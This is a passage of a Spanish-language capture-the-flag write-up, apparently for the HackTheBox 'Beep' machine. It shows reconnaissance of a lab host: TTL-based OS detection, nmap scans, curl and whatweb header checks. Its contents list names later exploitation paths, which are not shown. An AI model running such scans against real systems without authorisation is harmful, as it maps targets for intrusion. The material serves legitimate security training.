@@ -1,0 +1,2242 @@
+<!doctype html><html lang=es>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noodp">
+<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
+<title>HackTheBox - Beep - wixnic</title><meta name=Description content="This is my description."><meta property="og:title" content="HackTheBox - Beep">
+<meta property="og:description" content="This is my description.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://wixnic.github.io/es/htb_beep/"><meta property="og:image" content="https://wixnic.github.io/logo.png"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-12-23T11:33:00+08:00">
+<meta property="article:modified_time" content="2021-12-23T11:33:00+08:00"><meta property="og:site_name" content="wixnic">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://wixnic.github.io/logo.png">
+<meta name=twitter:title content="HackTheBox - Beep">
+<meta name=twitter:description content="This is my description.">
+<meta name=application-name content="wixnic">
+<meta name=apple-mobile-web-app-title content="wixnic"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico>
+<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://wixnic.github.io/es/htb_beep/><link rel=prev href=https://wixnic.github.io/es/htb_traverxec/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HackTheBox - Beep","inLanguage":"es","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/wixnic.github.io\/es\/htb_beep\/"},"image":["https:\/\/wixnic.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"ssh, smtp, freepbx, elastix, smtp-log-poisoning, lfi, rce, ssh-algorithms, privilege-escalation-nmap, privilege-escalation-chmod, autopwn, bash, wget, curl, python","wordcount":5227,"url":"https:\/\/wixnic.github.io\/es\/htb_beep\/","datePublished":"2021-12-23T11:33:00+08:00","dateModified":"2021-12-23T11:33:00+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"https:\/\/wixnic.github.io\/images\/avatar.png"},"author":{"@type":"Person","name":"wixnic"},"description":"This is my description."}</script></head>
+<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark')&&document.body.setAttribute('theme','dark')</script>
+<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/es/ title=wixnic><span class=header-title-pre><i class="fas fa-user-ninja"></i></span>wixnic</a>
+</div>
+<div class=menu>
+<div class=menu-inner><a class=menu-item href=/es/> Inicio </a><a class=menu-item href=/es/posts/> Posts </a><a class=menu-item href=/es/tags/> Tags </a><a class=menu-item href=/es/categories/> Categorías </a><a class=menu-item href=/es/about/> Sobre Mí </a><a class=menu-item href=https://wixnic.gitbook.io/hacknotes/ rel="noopener noreffer" target=_blank> HackNotes </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item language" title="Selecciona el lenguage">Spanish<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select id=language-select-desktop onchange="location=this.value"><option value=/htb_beep/>English</option><option value=/es/htb_beep/ selected>Spanish</option></select>
+</a><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Busca títulos o contenido..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Buscar>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Limpiar>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-desktop>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Cambia el tema">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class=mobile id=header-mobile>
+<div class=header-container>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/es/ title=wixnic><span class=header-title-pre><i class="fas fa-user-ninja"></i></span>wixnic</a>
+</div>
+<div class=menu-toggle id=menu-toggle-mobile>
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class=menu id=menu-mobile><div class=search-wrapper>
+<div class="search mobile" id=search-mobile>
+<input type=text placeholder="Busca títulos o contenido..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Buscar>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Limpiar>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-mobile>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
+Cancelar
+</a>
+</div><a class=menu-item href=/es/ title>Inicio</a><a class=menu-item href=/es/posts/ title>Posts</a><a class=menu-item href=/es/tags/ title>Tags</a><a class=menu-item href=/es/categories/ title>Categorías</a><a class=menu-item href=/es/about/ title>Sobre Mí</a><a class=menu-item href=https://wixnic.gitbook.io/hacknotes/ title rel="noopener noreffer" target=_blank>HackNotes</a><a href=javascript:void(0); class="menu-item theme-switch" title="Cambia el tema">
+<i class="fas fa-adjust fa-fw"></i>
+</a><a href=javascript:void(0); class=menu-item title="Selecciona el lenguage">Spanish<i class="fas fa-chevron-right fa-fw"></i>
+<select class=language-select onchange="location=this.value"><option value=/htb_beep/>English</option><option value=/es/htb_beep/ selected>Spanish</option></select>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id=search-dropdown-desktop></div>
+</div>
+<div class="search-dropdown mobile">
+<div id=search-dropdown-mobile></div>
+</div>
+<main class=main>
+<div class=container><div class=toc id=toc-auto>
+<h2 class=toc-title>Contenido</h2>
+<div class=toc-content id=toc-content-auto></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">HackTheBox - Beep</h1><div class=post-meta>
+<div class=post-meta-line><span class=post-author><a href=/es/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>wixnic</a></span>&nbsp;<span class=post-category>incluido en <a href=/es/categories/hackthebox-nix/><i class="far fa-folder fa-fw"></i>HackTheBox Nix</a></span></div>
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-12-23>2021-12-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;5227 palabras&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;25 minutos&nbsp;<span id=/es/htb_beep/ class=leancloud_visitors data-flag-title="HackTheBox - Beep">
+<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;vistas
+</span>&nbsp;</div>
+</div><div class="details toc" id=toc-static kept>
+<div class="details-summary toc-title">
+<span>Contenido</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
+<ul>
+<li><a href=#set-up>Set up</a></li>
+<li><a href=#recon>Recon</a>
+<ul>
+<li><a href=#os-fingerprinting>OS Fingerprinting</a></li>
+<li><a href=#tcp-syn-scan>TCP SYN Scan</a></li>
+<li><a href=#service-fingerprinting>Service Fingerprinting</a></li>
+</ul>
+</li>
+<li><a href=#web---port-tcp-80---tcp-443>Web - Port TCP 80 -> TCP 443</a>
+<ul>
+<li><a href=#response-headers-enumeration>Response Headers Enumeration</a></li>
+<li><a href=#directory--files-fuzzing>Directory & Files Fuzzing</a>
+<ul>
+<li><a href=#admin>/admin</a></li>
+<li><a href=#searchsploit>Searchsploit</a></li>
+</ul>
+</li>
+<li><a href=#smtp---port-tcp-25>SMTP - Port TCP 25</a>
+<ul>
+<li><a href=#smtp-user-enumeration>SMTP User Enumeration</a></li>
+</ul>
+</li>
+<li><a href=#smtp-log-poisoning-through-lfi-to-rce-path-1>SMTP Log Poisoning through LFI to RCE [Path #1]</a></li>
+<li><a href=#ssh---tcp-22-path-2>SSH - TCP 22 [Path #2]</a></li>
+<li><a href=#webmin---tcp-10000>Webmin - TCP 10000</a></li>
+<li><a href=#shellshock-path-3>Shellshock [Path #3]</a></li>
+<li><a href=#webmin-command-path-4>Webmin Command [Path #4]</a></li>
+<li><a href=#freepbx-2100--elastix-220---remote-code-execution-path-5>FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution [Path #5]</a></li>
+</ul>
+</li>
+<li><a href=#privilege-escalation>Privilege Escalation</a></li>
+<li><a href=#autopwn>AutoPWN</a></li>
+</ul>
+</nav></div>
+</div><div class=content id=content><h1 id=set-up>Set up</h1>
+<p>Primero creo un directorio de trabajo:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ mkdir Beep
+❯ <span class=nb>cd</span> !$
+<span class=nb>cd</span> Beep
+</code></pre></td></tr></table>
+</div>
+</div><p>Luego uso la función <code>mk</code> que he definido en mi archivo de configuración de zsh, que uso para crear mis directorios de trabajo:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ which mk
+mk <span class=o>()</span> <span class=o>{</span>
+        mkdir <span class=o>{</span>scans,content,loot,exploits,scripts,report<span class=o>}</span>
+<span class=o>}</span>
+❯ mk
+❯ ls
+ content   exploits   loot   report   scans   scripts
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=recon>Recon</h1>
+<h2 id=os-fingerprinting>OS Fingerprinting</h2>
+<p>Esta es la función que he definido en el archivo de configuración de zsh <code>.zshrc</code> para identificar el sistema operativo basado en el valor TTL:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ which os
+os <span class=o>()</span> <span class=o>{</span>
+        <span class=nv>ttl</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>ping -c <span class=m>1</span> <span class=nv>$1</span> <span class=p>|</span> awk -F <span class=s1>&#39;ttl=&#39;</span> <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span>  -f <span class=m>1</span> <span class=p>|</span> tr -d <span class=s1>&#39;\n&#39;</span><span class=k>)</span><span class=s2>&#34;</span>
+        <span class=k>if</span> <span class=o>((</span> <span class=nv>$ttl</span> &lt;<span class=o>=</span> <span class=m>64</span> <span class=o>))</span>
+        <span class=k>then</span>
+                <span class=nb>echo</span> <span class=s1>&#39;OS: Unix/Linux&#39;</span>
+        <span class=k>elif</span> <span class=o>((</span> <span class=nv>$ttl</span> &lt;<span class=o>=</span> <span class=m>128</span> <span class=o>))</span>
+        <span class=k>then</span>
+                <span class=nb>echo</span> <span class=s1>&#39;OS: Windows&#39;</span>
+        <span class=k>else</span>
+                <span class=nb>echo</span> <span class=s1>&#39;OS: Not detected&#39;</span>
+        <span class=k>fi</span>
+<span class=o>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos identificar el sistema operativo ejecutando el siguiente comando:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ os 10.10.10.7
+OS: Unix/Linux
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=tcp-syn-scan>TCP SYN Scan</h2>
+<p>Entonces podemos intentar ejecutar un <code>TCP SYN scan</code>, no confundirlo con un <code>TCP connect scan</code>, nmap utiliza un TCP SYN Scan <code>-sS</code> por defecto, por lo que no es necesario especificarlo.</p>
+<p>Puedes leer la página de manual aquí: <img class=lazyload src=/svg/loading.min.svg data-src=https://nmap.org/book/man-port-scanning-techniques.html data-srcset="https://nmap.org/book/man-port-scanning-techniques.html, https://nmap.org/book/man-port-scanning-techniques.html 1.5x, https://nmap.org/book/man-port-scanning-techniques.html 2x" data-sizes=auto alt=https://nmap.org/book/man-port-scanning-techniques.html title=nmap></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sudo nmap -p- -n -Pn --min-rate <span class=m>5000</span> -oG scans/nmap-tcpall 10.10.10.7
+<span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali:
+Sorry, try again.
+<span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali:
+Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-12-22 15:48 EST
+Nmap scan report <span class=k>for</span> 10.10.10.7
+Host is up <span class=o>(</span>0.25s latency<span class=o>)</span>.
+Not shown: <span class=m>65519</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+80/tcp    open  http
+110/tcp   open  pop3
+111/tcp   open  rpcbind
+143/tcp   open  imap
+443/tcp   open  https
+878/tcp   open  unknown
+993/tcp   open  imaps
+995/tcp   open  pop3s
+3306/tcp  open  mysql
+4190/tcp  open  sieve
+4445/tcp  open  upnotifyp
+4559/tcp  open  hylafax
+5038/tcp  open  unknown
+10000/tcp open  snet-sensor-mgmt
+
+Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 11.31 seconds
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=service-fingerprinting>Service Fingerprinting</h2>
+<p>Esta es otra función que tengo en mi zsh para extraer puertos TCP:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ which xp
+xp <span class=o>()</span> <span class=o>{</span>
+	<span class=nv>ports</span><span class=o>=</span><span class=s2>&#34;</span><span class=k>$(</span>cat <span class=nv>$1</span> <span class=p>|</span> grep -oP <span class=s1>&#39;\d{1,5}/open&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f <span class=m>1</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed s/,$//<span class=k>)</span><span class=s2>&#34;</span>
+	<span class=nb>echo</span> <span class=s2>&#34;[+] Open ports: </span><span class=nv>$ports</span><span class=s2>&#34;</span> &gt;&gt; xp.tmp
+	<span class=nb>printf</span> <span class=nv>$ports</span> <span class=p>|</span> xclip -sel clip
+	<span class=nb>echo</span> <span class=s2>&#34;[+] Ports copied to clipboard&#34;</span> &gt;&gt; xp.tmp
+	/usr/bin/bat xp.tmp
+	rm xp.tmp
+<span class=o>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Luego extraigo los puertos TCP:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ xp scans/nmap-tcpall
+───────┬───────────────────────────────────────────────────────────────────────────────
+       │ File: xp.tmp
+───────┼───────────────────────────────────────────────────────────────────────────────
+   <span class=m>1</span>   │ <span class=o>[</span>+<span class=o>]</span> Open ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,
+       │ <span class=m>10000</span>
+   <span class=m>2</span>   │ <span class=o>[</span>+<span class=o>]</span> Ports copied to clipboard
+───────┴───────────────────────────────────────────────────────────────────────────────
+</code></pre></td></tr></table>
+</div>
+</div><p>Nmap tiene algunos scripts que podemos utilizar para recopilar información sobre los servicios:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>find / -name <span class=s1>&#39;*.nse&#39;</span> -type f 2&gt;/dev/null
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora me gusta enumerar los servicios usando los de scripts nmap y ver el tiempo de ejecución con <code>-vvv</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>sudo nmap -p 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 -n -Pn --min-rate <span class=m>5000</span> -sCV -oN scans/nmap-tcpscripts 10.10.10.7 -vvv
+</code></pre></td></tr></table>
+</div>
+</div><p>Una vez que termina, podemos leer el archivo de nmap:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>cat scans/nmap-tcpscripts.nmap 
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=web---port-tcp-80---tcp-443>Web - Port TCP 80 -> TCP 443</h1>
+<h2 id=response-headers-enumeration>Response Headers Enumeration</h2>
+<p>Cuando enumeramos las cabeceras (headers) de respuesta podemos ver un 302 encontrado:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -I http://10.10.10.7
+HTTP/1.1 <span class=m>302</span> Found
+Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 22:44:21 GMT
+Server: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
+Location: https://10.10.10.7/
+Connection: close
+Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>iso-8859-1
+</code></pre></td></tr></table>
+</div>
+</div><p>Sigamos la redirección con <code>-L</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -I http://10.10.10.7 -L
+HTTP/1.1 <span class=m>302</span> Found
+Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 22:44:29 GMT
+Server: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
+Location: https://10.10.10.7/
+Connection: close
+Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>iso-8859-1
+
+curl: <span class=o>(</span>60<span class=o>)</span> SSL certificate problem: self signed certificate
+More details here: https://curl.se/docs/sslcerts.html
+
+curl failed to verify the legitimacy of the server and therefore could not
+establish a secure connection to it. To learn more about this situation and
+how to fix it, please visit the web page mentioned above.
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos ver un problema dell certificado SSL, así que vamos a ignorarlo con <code>-k</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -Ik http://10.10.10.7 -L
+HTTP/1.1 <span class=m>302</span> Found
+Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 22:46:05 GMT
+Server: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
+Location: https://10.10.10.7/
+Connection: close
+Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>iso-8859-1
+
+HTTP/1.1 <span class=m>200</span> OK
+Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 22:46:06 GMT
+Server: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
+X-Powered-By: PHP/5.1.6
+Set-Cookie: <span class=nv>elastixSession</span><span class=o>=</span>7mh9441083miqlnc9f5t7iff25<span class=p>;</span> <span class=nv>path</span><span class=o>=</span>/
+Expires: Thu, <span class=m>19</span> Nov <span class=m>1981</span> 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check<span class=o>=</span>0, pre-check<span class=o>=</span><span class=m>0</span>
+Pragma: no-cache
+Connection: close
+Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
+</code></pre></td></tr></table>
+</div>
+</div><p>Alternativamente, podemos hacer esto de una sola vez con whatweb:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ whatweb -a <span class=m>3</span> -v 10.10.10.7
+WhatWeb report <span class=k>for</span> http://10.10.10.7
+Status    : <span class=m>302</span> Found
+Title     : <span class=m>302</span> Found
+IP        : 10.10.10.7
+Country   : RESERVED, ZZ
+
+Summary   : HTTPServer<span class=o>[</span>CentOS<span class=o>][</span>Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)]</span>, Apache<span class=o>[</span>2.2.3<span class=o>]</span>, RedirectLocation<span class=o>[</span>https://10.10.10.7/<span class=o>]</span>
+
+Detected Plugins:
+<span class=o>[</span> Apache <span class=o>]</span>
+        The Apache HTTP Server Project is an effort to develop and
+        maintain an open-source HTTP server <span class=k>for</span> modern operating
+        systems including UNIX and Windows NT. The goal of this
+        project is to provide a secure, efficient and extensible
+        server that provides HTTP services in sync with the current
+        HTTP standards.
+
+        Version      : 2.2.3 <span class=o>(</span>from HTTP Server Header<span class=o>)</span>
+        Google Dorks: <span class=o>(</span>3<span class=o>)</span>
+        Website     : http://httpd.apache.org/
+
+<span class=o>[</span> HTTPServer <span class=o>]</span>
+        HTTP server header string. This plugin also attempts to
+        identify the operating system from the server header.
+
+        OS           : CentOS
+        String       : Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span> <span class=o>(</span>from server string<span class=o>)</span>
+
+<span class=o>[</span> RedirectLocation <span class=o>]</span>
+        HTTP Server string location. used with http-status <span class=m>301</span> and
+        <span class=m>302</span>
+
+        String       : https://10.10.10.7/ <span class=o>(</span>from location<span class=o>)</span>
+
+HTTP Headers:
+        HTTP/1.1 <span class=m>302</span> Found
+        Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 23:02:27 GMT
+        Server: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
+        Location: https://10.10.10.7/
